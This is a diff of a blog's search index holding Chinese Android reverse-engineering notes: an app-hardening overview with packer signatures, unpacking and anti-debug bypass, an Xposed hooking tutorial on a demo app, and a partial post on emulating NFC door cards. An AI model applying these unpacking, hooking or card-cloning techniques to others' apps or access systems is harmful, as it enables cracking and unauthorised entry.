@@ -1,6 +1,11 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>frida学习笔记</title>
+    <url>/post/1079078189.html</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
     <title>daily-2020</title>
     <url>/post/1404092993.html</url>
     <content><![CDATA[<h1 id="2020的daily"><a href="#2020的daily" class="headerlink" title="2020的daily"></a>2020的daily</h1><p>2020注定是个不平凡的一年，也希望在此刻做出改变，我也经历了很多事情，也因此成长了很多，但是万万没有想到坚持了近3年的博客断更了，觉得确实不太好，本来是个挺好的习惯，然而却给丢弃了，虽然我也没有输出什么干货，但是觉得坚持还是有必要的，有输入也需要有输出，才能找到自己的不足。</p>
@@ -335,8 +340,8 @@ chmod 755 /data/local/tmp/frida-server
     <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>用于修改apk的调试标志<br>修改<br>xposed插件：BuildProp Enhancer(插件地址<a href="http://repo.xposed.info/module/com.jecelyin.buildprop" target="_blank" rel="noopener">http://repo.xposed.info/module/com.jecelyin.buildprop</a> )<br>百度 网盘链接:<a href="https://pan.baidu.com/s/17fDLbqf1Dhqo7AtdBFuqYw" target="_blank" rel="noopener">https://pan.baidu.com/s/17fDLbqf1Dhqo7AtdBFuqYw</a>  密码:y6vx  </p>
 ]]></content>
       <tags>
-        <tag>xposed</tag>
         <tag>android安全</tag>
+        <tag>xposed</tag>
         <tag>xposed module</tag>
       </tags>
   </entry>
@@ -3352,84 +3357,6 @@ public ParcelFileDescriptor openFile(Uri paramUri,String paramString) throws Fil
       </tags>
   </entry>
   <entry>
-    <title>android加固</title>
-    <url>/post/3671652172.html</url>
-    <content><![CDATA[<h2 id="app加固威胁"><a href="#app加固威胁" class="headerlink" title="app加固威胁"></a>app加固威胁</h2><ul>
-<li>代码修改(广告植入、替换广告id)</li>
-<li>资源修改(界面替换广告，链接替换)</li>
-<li>破解(应用收费，内购)</li>
-<li>篡改数据(无限金币,钻石)</li>
-<li>加入恶意代码(木马，隐私，交易)</li>
-<li>动态注入，数据拦截，窃取，修改；协议修改</li>
-</ul>
-<h2 id="app加固的目的"><a href="#app加固的目的" class="headerlink" title="app加固的目的"></a>app加固的目的</h2><ul>
-<li>保护核心代码，防止被逆向，泄密 防止逆向分析-防止核心代码被反编译</li>
-<li>防止营销作弊</li>
-<li>防止代码被修改</li>
-<li>控制被二次打包-校验完整性，签名，防止盗版</li>
-<li>防止调试和注入-防止动态调试，注入获取关键数据</li>
-<li>防止应用数据窃取-加密敏感数据</li>
-<li>防止协议直接被盗刷-加密协议通信</li>
-</ul>
-<h2 id="加固技术的发展历史"><a href="#加固技术的发展历史" class="headerlink" title="加固技术的发展历史"></a>加固技术的发展历史</h2><ul>
-<li>第一代 DEX加密、字符串加密、资源加密、反调试、自定义DexClassLoader </li>
-<li>第二代 核心封装到So库/方法抽取/反调试</li>
-<li>第三代 ELF变形/Ollvm混淆/多进程保护</li>
-<li>第四代 代码虚拟化保护 DEX虚拟化保护</li>
-<li>第五代 ARM虚拟化保护</li>
-</ul>
-<h2 id="常见加固厂商"><a href="#常见加固厂商" class="headerlink" title="常见加固厂商"></a>常见加固厂商</h2><ul>
-<li>加固保360</li>
-</ul>
-<p><a href="http://jiagu.360.cn/#/global/index" target="_blank" rel="noopener">360加固保</a></p>
-<ul>
-<li>娜迦nagapt</li>
-</ul>
-<p><a href="http://www.nagain.com/" target="_blank" rel="noopener">娜迦加固</a>  </p>
-<ul>
-<li>梆梆bangcle</li>
-</ul>
-<p><a href="https://www.bangcle.com/" target="_blank" rel="noopener">梆梆加固</a></p>
-<ul>
-<li>爱加密ijm</li>
-</ul>
-<p><a href="http://www.ijiami.cn/appprotect_encrypt_way" target="_blank" rel="noopener">爱加密加固</a></p>
-<ul>
-<li>阿里</li>
-<li>百度，盛大，腾讯，网秦，通付盾</li>
-</ul>
-<h2 id="常见加固方式"><a href="#常见加固方式" class="headerlink" title="常见加固方式"></a>常见加固方式</h2><p>类加载技术：<br>针对apk中的classes.dex文件进行处理，放入待定的文件中，通过native代码来进行对其运行时解密。  </p>
-<p>使用厂商：娜迦，爱加密，梆梆等。  </p>
-<p>方法替换技术：<br>将classes.dex中的方法中代码进行提取，抽取方法，在运行时对其动态进行解密还原  </p>
-<p>梆梆，娜迦  </p>
-<h2 id="常用加固厂商特征"><a href="#常用加固厂商特征" class="headerlink" title="常用加固厂商特征"></a>常用加固厂商特征</h2><ul>
-<li>娜迦 libchaosvmp.so,libddog.so libfdog.so</li>
-<li>爱加密 libexec.so,libexecmain.so</li>
-<li>梆梆 libsecexe.so libsecmain.so libDexHelper.so</li>
-<li>360 libprotectClass.so libjiagu.so</li>
-<li>通付盾 libegis.so</li>
-<li>网秦 libnqshield.so</li>
-<li>百度 libbaiduprotect.so</li>
-</ul>
-<h2 id="脱壳的手法"><a href="#脱壳的手法" class="headerlink" title="脱壳的手法"></a>脱壳的手法</h2><ul>
-<li>修改系统源码自动脱壳</li>
-<li>通过hook方式对关键函数进行脱壳</li>
-<li>开源工具入ZjDroid，DexHunter进行脱壳</li>
-<li>利用IDA或者GDB动态调试进行脱壳</li>
-</ul>
-<h2 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h2><p>反调试代码，都是在壳子的so中执行的，那么，我们只要在进入壳子第一行代码时下了断点，在调试过程中，找到了反调试检测代码的位置，直接干掉，直接绕过反调试  </p>
-<p>在libdvm.so中方法loadNativeCode处下断点，android系统加载加载native代码也就是so文件都要走的函数，所以下在这里的断点，能够有效的找到加载壳子的so位置，能够在一进入壳子的so，直接断住。  </p>
-<p>最简单的技巧，就是单步调试，F8一路按下去，按的多了，就有了更好的位置下断点。  </p>
-<p>记住一点就好，壳子的so中，总有一处是解密还原出app原本的dex的。  </p>
-]]></content>
-      <categories>
-        <category>android安全</category>
-      </categories>
-      <tags>
-        <tag>android安全</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>android Activity漏洞挖掘</title>
     <url>/post/2470166639.html</url>
     <content><![CDATA[<h2 id="越权绕过漏洞"><a href="#越权绕过漏洞" class="headerlink" title="越权绕过漏洞"></a>越权绕过漏洞</h2><p>在Android系统中，Activity默认是不导出的，如果设置了 <code>exported=&quot;true&quot;</code> 这样的关键值或者是添加了<code>&lt;intent-filter&gt;</code>这样的属性，并且没有显示的设置为<code>exported=&quot;false&quot;</code>,那么此时Activity是导出的，如果Activity被不合理的导出，那么就会有越权绕过或者是泄漏敏感信息等安全风险，比如在业务过程中会有一些敏感的界面是需要用户输入密码才能查看的，但是如果没有对调起此activity的组件进行权限验证，那么就会造成验证的越权问题，导致恶意的攻击者不需要输入密码等信息也可以打开这个界面。还有通过Intent给Activity传输畸形数据使得程序崩溃拒绝服务影响用户体验或Activity界面被劫持产生欺诈等安全事件。  </p>
@@ -3513,6 +3440,84 @@ this.b=(RouterConfig)this.getIntent().getParcelableExtra(&quot;filed_router_conf
 谨慎处理接收的intent以及其携带的信息。  
 对接收到的任何数据做try catch处理，以及对不符合预期的数据做异常处理。  
 </code></pre>]]></content>
+      <categories>
+        <category>android安全</category>
+      </categories>
+      <tags>
+        <tag>android安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>android加固</title>
+    <url>/post/3671652172.html</url>
+    <content><![CDATA[<h2 id="app加固威胁"><a href="#app加固威胁" class="headerlink" title="app加固威胁"></a>app加固威胁</h2><ul>
+<li>代码修改(广告植入、替换广告id)</li>
+<li>资源修改(界面替换广告，链接替换)</li>
+<li>破解(应用收费，内购)</li>
+<li>篡改数据(无限金币,钻石)</li>
+<li>加入恶意代码(木马，隐私，交易)</li>
+<li>动态注入，数据拦截，窃取，修改；协议修改</li>
+</ul>
+<h2 id="app加固的目的"><a href="#app加固的目的" class="headerlink" title="app加固的目的"></a>app加固的目的</h2><ul>
+<li>保护核心代码，防止被逆向，泄密 防止逆向分析-防止核心代码被反编译</li>
+<li>防止营销作弊</li>
+<li>防止代码被修改</li>
+<li>控制被二次打包-校验完整性，签名，防止盗版</li>
+<li>防止调试和注入-防止动态调试，注入获取关键数据</li>
+<li>防止应用数据窃取-加密敏感数据</li>
+<li>防止协议直接被盗刷-加密协议通信</li>
+</ul>
+<h2 id="加固技术的发展历史"><a href="#加固技术的发展历史" class="headerlink" title="加固技术的发展历史"></a>加固技术的发展历史</h2><ul>
+<li>第一代 DEX加密、字符串加密、资源加密、反调试、自定义DexClassLoader </li>
+<li>第二代 核心封装到So库/方法抽取/反调试</li>
+<li>第三代 ELF变形/Ollvm混淆/多进程保护</li>
+<li>第四代 代码虚拟化保护 DEX虚拟化保护</li>
+<li>第五代 ARM虚拟化保护</li>
+</ul>
+<h2 id="常见加固厂商"><a href="#常见加固厂商" class="headerlink" title="常见加固厂商"></a>常见加固厂商</h2><ul>
+<li>加固保360</li>
+</ul>
+<p><a href="http://jiagu.360.cn/#/global/index" target="_blank" rel="noopener">360加固保</a></p>
+<ul>
+<li>娜迦nagapt</li>
+</ul>
+<p><a href="http://www.nagain.com/" target="_blank" rel="noopener">娜迦加固</a>  </p>
+<ul>
+<li>梆梆bangcle</li>
+</ul>
+<p><a href="https://www.bangcle.com/" target="_blank" rel="noopener">梆梆加固</a></p>
+<ul>
+<li>爱加密ijm</li>
+</ul>
+<p><a href="http://www.ijiami.cn/appprotect_encrypt_way" target="_blank" rel="noopener">爱加密加固</a></p>
+<ul>
+<li>阿里</li>
+<li>百度，盛大，腾讯，网秦，通付盾</li>
+</ul>
+<h2 id="常见加固方式"><a href="#常见加固方式" class="headerlink" title="常见加固方式"></a>常见加固方式</h2><p>类加载技术：<br>针对apk中的classes.dex文件进行处理，放入待定的文件中，通过native代码来进行对其运行时解密。  </p>
+<p>使用厂商：娜迦，爱加密，梆梆等。  </p>
+<p>方法替换技术：<br>将classes.dex中的方法中代码进行提取，抽取方法，在运行时对其动态进行解密还原  </p>
+<p>梆梆，娜迦  </p>
+<h2 id="常用加固厂商特征"><a href="#常用加固厂商特征" class="headerlink" title="常用加固厂商特征"></a>常用加固厂商特征</h2><ul>
+<li>娜迦 libchaosvmp.so,libddog.so libfdog.so</li>
+<li>爱加密 libexec.so,libexecmain.so</li>
+<li>梆梆 libsecexe.so libsecmain.so libDexHelper.so</li>
+<li>360 libprotectClass.so libjiagu.so</li>
+<li>通付盾 libegis.so</li>
+<li>网秦 libnqshield.so</li>
+<li>百度 libbaiduprotect.so</li>
+</ul>
+<h2 id="脱壳的手法"><a href="#脱壳的手法" class="headerlink" title="脱壳的手法"></a>脱壳的手法</h2><ul>
+<li>修改系统源码自动脱壳</li>
+<li>通过hook方式对关键函数进行脱壳</li>
+<li>开源工具入ZjDroid，DexHunter进行脱壳</li>
+<li>利用IDA或者GDB动态调试进行脱壳</li>
+</ul>
+<h2 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h2><p>反调试代码，都是在壳子的so中执行的，那么，我们只要在进入壳子第一行代码时下了断点，在调试过程中，找到了反调试检测代码的位置，直接干掉，直接绕过反调试  </p>
+<p>在libdvm.so中方法loadNativeCode处下断点，android系统加载加载native代码也就是so文件都要走的函数，所以下在这里的断点，能够有效的找到加载壳子的so位置，能够在一进入壳子的so，直接断住。  </p>
+<p>最简单的技巧，就是单步调试，F8一路按下去，按的多了，就有了更好的位置下断点。  </p>
+<p>记住一点就好，壳子的so中，总有一处是解密还原出app原本的dex的。  </p>
+]]></content>
       <categories>
         <category>android安全</category>
       </categories>
@@ -3775,6 +3780,111 @@ mount: Permission denied</code>这个问题就新开一个命令行窗口执行<
       </tags>
   </entry>
   <entry>
+    <title>android VitualXposed 模块编写</title>
+    <url>/post/4010998048.html</url>
+    <content><![CDATA[<h2 id="virtual-Xposed"><a href="#virtual-Xposed" class="headerlink" title="virtual Xposed"></a>virtual Xposed</h2><p><a href="https://pan.baidu.com/s/1GHoOGm7DuBtkL9AgsaJvNA" target="_blank" rel="noopener">virtual Xposed下载链接: </a><br>提取码: kyrd    </p>
+<p><a href="https://github.com/android-hacker/VirtualXposed/wiki/Utilities-For-Xposed-Module-Developer" target="_blank" rel="noopener">virtual xposed wiki</a>  </p>
+<h2 id="vx的一些命令"><a href="#vx的一些命令" class="headerlink" title="vx的一些命令"></a>vx的一些命令</h2><pre><code>adb shell am start io.va.exposed/io.virtualapp.splash.SplashActivity 启动
+adb shell am broadcast -a io.va.exposed.CMD -e cmd reboot 重启
+adb shell am broadcast -a io.va.exposed.CMD -e cmd update -e pkg &lt;package-name&gt; 安装更新app
+adb shell am broadcast -a io.va.exposed.CMD -e cmd launch -e pkg &lt;package-name&gt; 启动内部app
+</code></pre><h2 id="编写Xposed模块"><a href="#编写Xposed模块" class="headerlink" title="编写Xposed模块"></a>编写Xposed模块</h2><p>1.xposed依赖<br><a href="https://jcenter.bintray.com/de/robv/android/xposed/api/" target="_blank" rel="noopener">xposed</a>  </p>
+<p>build.gradle中添加  </p>
+<pre><code>compileOnly &#39;de.robv.android.xposed:api:82&#39;
+compileOnly &#39;de.robv.android.xposed:api:82:sources&#39;
+</code></pre><p>2.AndroidManifest.xml添加Xposed模块  </p>
+<pre><code>&lt;application&gt;
+    &lt;meta-data
+        android:name=&quot;xposedmodule&quot;
+        android:value=&quot;true&quot; /&gt;
+    &lt;meta-data
+        android:name=&quot;xposeddescription&quot;
+        android:value=&quot;this is a xposed demo&quot; /&gt;
+    &lt;meta-data
+        android:name=&quot;xposedminversion&quot;
+        android:value=&quot;30&quot; /&gt;
+&lt;/application&gt;
+</code></pre><p>3.新建个项目为被hook  </p>
+<p>MainActivity.java  </p>
+<pre><code>public class MainActivity extends AppCompatActivity {
+
+    private Button btn;
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+        btn = findViewById(R.id.btn);
+        btn.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View view) {
+                Toast.makeText(MainActivity.this, toastMessage(), Toast.LENGTH_SHORT).show();
+            }
+        });
+    }
+    public String toastMessage() {
+        return &quot;我没有被劫持&quot;;
+    }
+}
+</code></pre><p>activity_main.xml  </p>
+<pre><code>&lt;android.support.constraint.ConstraintLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;
+    xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;
+    xmlns:tools=&quot;http://schemas.android.com/tools&quot;
+    android:layout_width=&quot;match_parent&quot;
+    android:layout_height=&quot;match_parent&quot;
+    tools:context=&quot;.MainActivity&quot;&gt;
+    &lt;Button
+        android:id=&quot;@+id/btn&quot;
+        app:layout_constraintLeft_toLeftOf=&quot;parent&quot;
+        app:layout_constraintTop_toTopOf=&quot;parent&quot;
+        android:layout_width=&quot;wrap_content&quot;
+        android:layout_height=&quot;wrap_content&quot;
+        android:text=&quot;btn&quot;/&gt;
+
+&lt;/android.support.constraint.ConstraintLayout&gt;
+
+</code></pre><p>打包安装到VirtualXposed  </p>
+<p>4.编写hook类<br><a href="https://api.xposed.info/reference/de/robv/android/xposed/XposedHelpers.html" target="_blank" rel="noopener">XposedHelpers api</a>  </p>
+<pre><code>public class HookToast implements IXposedHookLoadPackage {
+    @Override
+    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) throws Throwable {
+        if (lpparam.packageName.equals(&quot;com.demo.myapplication&quot;)){
+            Class clazz = lpparam.classLoader.loadClass(&quot;com.demo.myapplication.MainActivity&quot;);
+            XposedHelpers.findAndHookMethod(clazz, &quot;toastMessage&quot;, new XC_MethodHook() {
+                @Override
+                protected void beforeHookedMethod(MethodHookParam param) throws Throwable { //hook之前
+//                    super.beforeHookedMethod(param);
+                    XposedBridge.log(&quot;you are been hooked&quot;); 
+                }
+
+                @Override
+                protected void afterHookedMethod(MethodHookParam param) throws Throwable { // hook之后
+//                    super.afterHookedMethod(param);
+                    param.setResult(&quot;hacked by tea&quot;); //改变返回结果 
+                }
+            });
+        }
+    }
+}
+</code></pre><pre><code>新建app/assets文件夹
+新建xposed_init文件
+添加
+com.demo.android_hook.HookToast //修改成你的hook类
+
+然后打包测试
+</code></pre><p>app/assets/xposed_init  </p>
+<pre><code>com.demo.android_hook.HookToast
+</code></pre><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/27/01.jpg" alt="最后效果">  </p>
+<h2 id="LINKS"><a href="#LINKS" class="headerlink" title="LINKS"></a>LINKS</h2><p><a href="https://blog.csdn.net/ZhangChengHai/article/details/82950334" target="_blank" rel="noopener">Magisk框架，VirtualXposed框架，Xposed框架比较</a><br><a href="https://github.com/wayu002/AlipayQRHook" target="_blank" rel="noopener">AlipayQRHook</a><br><a href="https://www.jianshu.com/p/938e8c4c00df" target="_blank" rel="noopener">Xposed 模块免重启开发(借助VirtualXposed)</a><br><a href="https://www.52pojie.cn/thread-688466-1-1.html" target="_blank" rel="noopener">【Xposed模块开发入门】真·第一课</a><br><a href="https://www.52pojie.cn/thread-821871-1-1.html" target="_blank" rel="noopener">XPosed插件自动生成支付宝收款二维码</a><br><a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=794312&amp;extra=page%3D1%26filter%3Ddigest%26digest%3D1" target="_blank" rel="noopener">Android支付宝蚂蚁森林能量自动收取插件开发原理解析</a><br><a href="https://blog.csdn.net/ryan168/article/details/82462821" target="_blank" rel="noopener">关于如何使用xposed来hook某支付软件</a><br><a href="https://blog.csdn.net/jiangwei0910410003/article/details/80037971" target="_blank" rel="noopener">Android逆向之旅—破解某支付软件防Xposed的hook功能检测机制过程分析</a><br><a href="https://blog.csdn.net/ly_xiamu/article/details/81940896" target="_blank" rel="noopener">xposed检测原理分析 -案例某付宝、某音</a><br><a href="https://www.jianshu.com/p/938e8c4c00df" target="_blank" rel="noopener">Xposed 模块免重启开发(借助VirtualXposed)</a><br><a href="https://blog.csdn.net/zhangmiaoping23/article/details/53365780" target="_blank" rel="noopener">Android Hook框架Xposed详解：从源代码分析到开发指南</a><br><a href="https://blog.csdn.net/zhangmiaoping23/article/details/80432276" target="_blank" rel="noopener">VirtualXposed</a><br><a href="https://blog.csdn.net/d3soft/article/details/53209352" target="_blank" rel="noopener">xposed框架-Hook修改imei imsi</a>  </p>
+]]></content>
+      <categories>
+        <category>android逆向</category>
+      </categories>
+      <tags>
+        <tag>android逆向</tag>
+        <tag>xposed</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>smali hello</title>
     <url>/post/229799766.html</url>
     <content><![CDATA[<h2 id="条件跳转分支"><a href="#条件跳转分支" class="headerlink" title="条件跳转分支"></a>条件跳转分支</h2><pre><code>条件跳转分支：
@@ -4003,111 +4113,6 @@ Hello World
       <tags>
         <tag>android逆向</tag>
         <tag>smali</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>android VitualXposed 模块编写</title>
-    <url>/post/4010998048.html</url>
-    <content><![CDATA[<h2 id="virtual-Xposed"><a href="#virtual-Xposed" class="headerlink" title="virtual Xposed"></a>virtual Xposed</h2><p><a href="https://pan.baidu.com/s/1GHoOGm7DuBtkL9AgsaJvNA" target="_blank" rel="noopener">virtual Xposed下载链接: </a><br>提取码: kyrd    </p>
-<p><a href="https://github.com/android-hacker/VirtualXposed/wiki/Utilities-For-Xposed-Module-Developer" target="_blank" rel="noopener">virtual xposed wiki</a>  </p>
-<h2 id="vx的一些命令"><a href="#vx的一些命令" class="headerlink" title="vx的一些命令"></a>vx的一些命令</h2><pre><code>adb shell am start io.va.exposed/io.virtualapp.splash.SplashActivity 启动
-adb shell am broadcast -a io.va.exposed.CMD -e cmd reboot 重启
-adb shell am broadcast -a io.va.exposed.CMD -e cmd update -e pkg &lt;package-name&gt; 安装更新app
-adb shell am broadcast -a io.va.exposed.CMD -e cmd launch -e pkg &lt;package-name&gt; 启动内部app
-</code></pre><h2 id="编写Xposed模块"><a href="#编写Xposed模块" class="headerlink" title="编写Xposed模块"></a>编写Xposed模块</h2><p>1.xposed依赖<br><a href="https://jcenter.bintray.com/de/robv/android/xposed/api/" target="_blank" rel="noopener">xposed</a>  </p>
-<p>build.gradle中添加  </p>
-<pre><code>compileOnly &#39;de.robv.android.xposed:api:82&#39;
-compileOnly &#39;de.robv.android.xposed:api:82:sources&#39;
-</code></pre><p>2.AndroidManifest.xml添加Xposed模块  </p>
-<pre><code>&lt;application&gt;
-    &lt;meta-data
-        android:name=&quot;xposedmodule&quot;
-        android:value=&quot;true&quot; /&gt;
-    &lt;meta-data
-        android:name=&quot;xposeddescription&quot;
-        android:value=&quot;this is a xposed demo&quot; /&gt;
-    &lt;meta-data
-        android:name=&quot;xposedminversion&quot;
-        android:value=&quot;30&quot; /&gt;
-&lt;/application&gt;
-</code></pre><p>3.新建个项目为被hook  </p>
-<p>MainActivity.java  </p>
-<pre><code>public class MainActivity extends AppCompatActivity {
-
-    private Button btn;
-    @Override
-    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
-        btn = findViewById(R.id.btn);
-        btn.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View view) {
-                Toast.makeText(MainActivity.this, toastMessage(), Toast.LENGTH_SHORT).show();
-            }
-        });
-    }
-    public String toastMessage() {
-        return &quot;我没有被劫持&quot;;
-    }
-}
-</code></pre><p>activity_main.xml  </p>
-<pre><code>&lt;android.support.constraint.ConstraintLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;
-    xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;
-    xmlns:tools=&quot;http://schemas.android.com/tools&quot;
-    android:layout_width=&quot;match_parent&quot;
-    android:layout_height=&quot;match_parent&quot;
-    tools:context=&quot;.MainActivity&quot;&gt;
-    &lt;Button
-        android:id=&quot;@+id/btn&quot;
-        app:layout_constraintLeft_toLeftOf=&quot;parent&quot;
-        app:layout_constraintTop_toTopOf=&quot;parent&quot;
-        android:layout_width=&quot;wrap_content&quot;
-        android:layout_height=&quot;wrap_content&quot;
-        android:text=&quot;btn&quot;/&gt;
-
-&lt;/android.support.constraint.ConstraintLayout&gt;
-
-</code></pre><p>打包安装到VirtualXposed  </p>
-<p>4.编写hook类<br><a href="https://api.xposed.info/reference/de/robv/android/xposed/XposedHelpers.html" target="_blank" rel="noopener">XposedHelpers api</a>  </p>
-<pre><code>public class HookToast implements IXposedHookLoadPackage {
-    @Override
-    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) throws Throwable {
-        if (lpparam.packageName.equals(&quot;com.demo.myapplication&quot;)){
-            Class clazz = lpparam.classLoader.loadClass(&quot;com.demo.myapplication.MainActivity&quot;);
-            XposedHelpers.findAndHookMethod(clazz, &quot;toastMessage&quot;, new XC_MethodHook() {
-                @Override
-                protected void beforeHookedMethod(MethodHookParam param) throws Throwable { //hook之前
-//                    super.beforeHookedMethod(param);
-                    XposedBridge.log(&quot;you are been hooked&quot;); 
-                }
-
-                @Override
-                protected void afterHookedMethod(MethodHookParam param) throws Throwable { // hook之后
-//                    super.afterHookedMethod(param);
-                    param.setResult(&quot;hacked by tea&quot;); //改变返回结果 
-                }
-            });
-        }
-    }
-}
-</code></pre><pre><code>新建app/assets文件夹
-新建xposed_init文件
-添加
-com.demo.android_hook.HookToast //修改成你的hook类
-
-然后打包测试
-</code></pre><p>app/assets/xposed_init  </p>
-<pre><code>com.demo.android_hook.HookToast
-</code></pre><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/27/01.jpg" alt="最后效果">  </p>
-<h2 id="LINKS"><a href="#LINKS" class="headerlink" title="LINKS"></a>LINKS</h2><p><a href="https://blog.csdn.net/ZhangChengHai/article/details/82950334" target="_blank" rel="noopener">Magisk框架，VirtualXposed框架，Xposed框架比较</a><br><a href="https://github.com/wayu002/AlipayQRHook" target="_blank" rel="noopener">AlipayQRHook</a><br><a href="https://www.jianshu.com/p/938e8c4c00df" target="_blank" rel="noopener">Xposed 模块免重启开发(借助VirtualXposed)</a><br><a href="https://www.52pojie.cn/thread-688466-1-1.html" target="_blank" rel="noopener">【Xposed模块开发入门】真·第一课</a><br><a href="https://www.52pojie.cn/thread-821871-1-1.html" target="_blank" rel="noopener">XPosed插件自动生成支付宝收款二维码</a><br><a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=794312&amp;extra=page%3D1%26filter%3Ddigest%26digest%3D1" target="_blank" rel="noopener">Android支付宝蚂蚁森林能量自动收取插件开发原理解析</a><br><a href="https://blog.csdn.net/ryan168/article/details/82462821" target="_blank" rel="noopener">关于如何使用xposed来hook某支付软件</a><br><a href="https://blog.csdn.net/jiangwei0910410003/article/details/80037971" target="_blank" rel="noopener">Android逆向之旅—破解某支付软件防Xposed的hook功能检测机制过程分析</a><br><a href="https://blog.csdn.net/ly_xiamu/article/details/81940896" target="_blank" rel="noopener">xposed检测原理分析 -案例某付宝、某音</a><br><a href="https://www.jianshu.com/p/938e8c4c00df" target="_blank" rel="noopener">Xposed 模块免重启开发(借助VirtualXposed)</a><br><a href="https://blog.csdn.net/zhangmiaoping23/article/details/53365780" target="_blank" rel="noopener">Android Hook框架Xposed详解：从源代码分析到开发指南</a><br><a href="https://blog.csdn.net/zhangmiaoping23/article/details/80432276" target="_blank" rel="noopener">VirtualXposed</a><br><a href="https://blog.csdn.net/d3soft/article/details/53209352" target="_blank" rel="noopener">xposed框架-Hook修改imei imsi</a>  </p>
-]]></content>
-      <categories>
-        <category>android逆向</category>
-      </categories>
-      <tags>
-        <tag>android逆向</tag>
-        <tag>xposed</tag>
       </tags>
   </entry>
   <entry>
@@ -4805,6 +4810,49 @@ void loop()
       </tags>
   </entry>
   <entry>
+    <title>android nfc模拟卡</title>
+    <url>/post/2987589929.html</url>
+    <content><![CDATA[<p><a href="http://bbs.xiaomi.cn/t-30553502-1-o1" target="_blank" rel="noopener">搞定加密卡！小米门禁卡模拟那些事</a>  </p>
+<h2 id="手机信息"><a href="#手机信息" class="headerlink" title="手机信息"></a>手机信息</h2><pre><code>手机：小米5s
+版本：MIUI10 8.11.1 开发版
+</code></pre><h2 id="0x00-解锁-amp-amp-刷机"><a href="#0x00-解锁-amp-amp-刷机" class="headerlink" title="0x00 解锁&amp;&amp;刷机"></a>0x00 解锁&amp;&amp;刷机</h2><p><strong>解锁</strong>  </p>
+<p>首先登录小米官网获取解锁工具<br><a href="https://unlock.update.miui.com" target="_blank" rel="noopener">解锁工具下载</a><br><a href="http://www.miui.com/thread-3367802-1-1.html" target="_blank" rel="noopener">小米手机解锁 Bootloader 教程以及常见问题</a>  </p>
+<p>官网给的解决方案： </p>
+<pre><code>请按照以下流程进行操作：
+1.进入“设置 -&gt; 开发者选项 -&gt; 设备解锁状态”中绑定账号和设备；
+2.手动进入Bootloader模式（关机后，同时按住开机键和音量下键）；
+3.通过USB连接手机，点击 “解锁”按钮；
+</code></pre><p>解锁的时候要检查解锁账号，要3天验证在这个手机登录  </p>
+<p>1.小米手机设置<br>设置-小米账号-登录小米账号<br>关机<br>进入Bootloader模式(同时按住开机键和音量下键)<br>会出现一个安卓小机器人下面FASTBOOT文字<br>usb连接电脑  </p>
+<p>2.电脑端<br>打开下载的手机解锁工具<br>点击解锁<br>然后弹出确认解锁<br>等待解锁  </p>
+<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/25/01.png" alt=""></p>
+<pre><code>设置 -&gt; 更多设置 -&gt; 开发者选项 -&gt; 设备解锁状态 -&gt; 绑定账号和设备  
+关机 -&gt; 同时按住开机键和音量下键 -&gt; 打开下载的工具 -&gt; 手机连接 -&gt; 解锁 
+
+
+开发者选项:
+我的设备 - 全部参数 - MIUI版本 多次按 进入开发者模式  
+</code></pre><p><strong>刷机</strong>  </p>
+<p><a href="http://www.miui.com/shuaji-393.html" target="_blank" rel="noopener">通用线刷教程</a>  </p>
+<p>参考了上面的文章  </p>
+<p>步骤：<br>下载通用解锁工具<br>下载线刷包下载开发版的(开发版自带root)<br>手机关机状态下，同时按住 音量下+电源键 进入Fastboot模式将手机USB连接电脑。<br>usb连接电脑<br>解压线刷包<br>打开通用解锁工具<br>选择解压目录<br>点击加载设备<br>刷机<br>等待成功  </p>
+<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/25/02.png" alt=""></p>
+<h2 id="0x01-nfc软件"><a href="#0x01-nfc软件" class="headerlink" title="0x01 nfc软件"></a>0x01 nfc软件</h2><p>在酷安找到了一些app<br><a href="https://www.coolapk.com/search?q=nfc" target="_blank" rel="noopener">nfc list</a><br>然后测试了一下NFC卡模拟  </p>
+<p>然后给NFC卡模拟 root权限 和 nfc权限  </p>
+<p>安全中心-应用管理-权限-ROOT权限管理 给 NFC卡模拟  </p>
+<p><strong>然后测试软件</strong><br>卡读取成功了<br>然后测试门禁不好使  </p>
+<hr>
+<p>后文再续</p>
+<p><a href="http://www.miui.com/thread-5869303-1-1.html" target="_blank" rel="noopener">【教程】让你的手机模拟门禁卡 拿着手机进小区 加密也模拟</a><br><a href="http://tieba.baidu.com/p/5759500931" target="_blank" rel="noopener">成功复制加密门禁卡！！！</a><br><a href="https://club.huawei.com/thread-12231900-1-1.html" target="_blank" rel="noopener">【原创】浅谈NFC手机模拟门禁卡、饭卡（非ROOT）-精华帖</a><br><a href="https://www.coolapk.com/apk/com.yuanwofei.cardemulator" target="_blank" rel="noopener">NFC卡模拟</a><br><a href="https://www.freebuf.com/geek/80368.html" target="_blank" rel="noopener">如何利用Nexus 5伪造一张门禁卡</a><br><a href="http://www.jinciwei.cn/f268134.html" target="_blank" rel="noopener">搞定加密卡！小米门禁卡模拟那些事</a><br><a href="https://club.huawei.com/thread-14272732-1-1.html" target="_blank" rel="noopener">Root神器–超级授权SuperSU_v2.82-SR5专业破解最新版！</a><br><a 